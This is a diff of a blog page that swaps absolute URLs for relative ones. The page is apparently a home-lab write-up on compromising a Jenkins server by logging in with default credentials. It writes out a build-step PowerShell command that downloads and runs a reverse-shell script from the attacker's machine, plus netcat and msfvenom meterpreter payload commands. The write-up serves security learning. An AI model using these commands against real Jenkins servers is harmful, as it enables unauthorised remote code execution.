@@ -29,11 +29,11 @@
     
 
 
-    <base href="https://bsssq.xyz/">
-    <link rel="stylesheet" href="https://bsssq.xyz/css/style.css">
-    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
+    <base href="/">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/custom.css">
 </head>
-    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
+    <link rel="stylesheet" href="/css/custom.css">
 </head>
 <body>
     
@@ -51,29 +51,29 @@
 <p><strong>CI</strong>: involves devs making small changes and checks to their code. the scale of these changes can be huge so the process is automated to ensure that teams can build, test, and package their apps in a reliable way. CI can also help to streamline code changes.</p>
 <p><strong>CD (continuous delivery)</strong>: this is the automated delivery of completed code to environments like testing and development.</p>
 <p><strong>CD (continuous deployment)</strong>: every change that passes the automated tests is automatically placed in production, resulting in many production deployments. this is the ultimate goal of many companies, given they&rsquo;re not constrained by regulatory or compliance requirements.</p>
-<p><img src="https://bsssq.xyz/CICD-DevOps.png" alt="cicd"></p>
+<p><img src="/CICD-DevOps.png" alt="cicd"></p>
 <h2 id="jenkins">jenkins</h2>
 <p>jenkins is an open-source CI/CD automation software, written in java. it&rsquo;s used to implement CI/CD workflows, called pipelines.</p>
 <p>pipelines automate testing and reporting on isolated changes in a larger code base (in real time) and facilitates integration of disparate branches of code into a main branch. pipelines also rapidly detect defects in a code base, build the software, automate testing of builds, prepare code base for deployment/delivery, and ultimately deploy code to containers and virtual machines (as well as bare metal and cloud servers).</p>
 <p>for this experiment, i&rsquo;ve spun up a windows VM that hosts the jenkins instance, and try to attack it from my kali VM.</p>
 <p>once everything is set up, let&rsquo;s start with a simple nmap scan of the target machine.</p>
 <pre tabindex="0"><code>nmap -sT -Pn -v 10.10.77.68
-</code></pre><p><img src="https://bsssq.xyz/jenkins-nmap.png" alt="nmap"></p>
+</code></pre><p><img src="/jenkins-nmap.png" alt="nmap"></p>
 <p>the service at port 8080 is the jenkins server. to visit it, simply enter http://10.10.77.68:8080. at the login page, i&rsquo;ll enter my credentials (admin:admin) [note: default credentials for jenkins are usually admin:password or admin:admin] and be taken to the jenkins dashboard. there you&rsquo;ll see a &ldquo;project&rdquo; that was created just for this experiment.</p>
-<p><img src="https://bsssq.xyz/jenkins-dashboard.png" alt="dashboard"></p>
+<p><img src="/jenkins-dashboard.png" alt="dashboard"></p>
 <p>since this is a windows application, i&rsquo;ll use the <a href="https://github.com/samratashok/nishang">nishang</a> repo for a script, more specifically <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">this</a> reverse shell script. nishang also contains a whole bunch of scripts for initial access, enumeration, and privesc so check them all out if you&rsquo;d like.</p>
 <p>in kali, i created a directory to download the script to.</p>
 <pre tabindex="0"><code>wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 </code></pre><p>now let&rsquo;s create a simple web server so that this script can be downloaded into jenkins.</p>
 <pre tabindex="0"><code>python -m SimpleHTTPServer 80
 </code></pre><p>back in jenkins, if you click &ldquo;project&rdquo; &gt; configure &gt; build, you&rsquo;ll see a command box that lets you execute any command.</p>
-<p><img src="https://bsssq.xyz/jenkins-build.png" alt="build"></p>
+<p><img src="/jenkins-build.png" alt="build"></p>
 <p>first, start a netcat listener in kali.</p>
 <pre tabindex="0"><code>nc -lvnp 9001
 </code></pre><p>in the jenkins command box, enter the following command to download the powershell script to the target. remember to use the address of the HTTP server that was created.</p>
 <pre tabindex="0"><code>powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://10.9.4.75:80/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.75 -Port 9001
 </code></pre><p>save the build, then click &ldquo;build now&rdquo; from the project page. the netcat listener will receive a connection to the target.</p>
-<p><img src="https://bsssq.xyz/jenkins-netcat.png" alt="netcat"></p>
+<p><img src="/jenkins-netcat.png" alt="netcat"></p>
 <p>to make privesc easier, it&rsquo;s better to switch to a meterpreter shell.</p>
 <p>first, create an msfvenom payload in the same directory we saved the powershell script to.</p>
 <pre tabindex="0"><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.4.75 LPORT=9002 -f exe -o jenkins.exe
@@ -139,8 +139,8 @@ the most commonly abused privileges are:</p>
 </div>
 
     
-     <script src="https://bsssq.xyz/p5/p5.min.js"></script>
-     <script src="https://bsssq.xyz/js/genart.js"></script>
-     <script src="https://bsssq.xyz/js/main.js"></script>
+     <script src="/p5/p5.min.js"></script>
+     <script src="/js/genart.js"></script>
+     <script src="/js/main.js"></script>
 </body>
 </html>
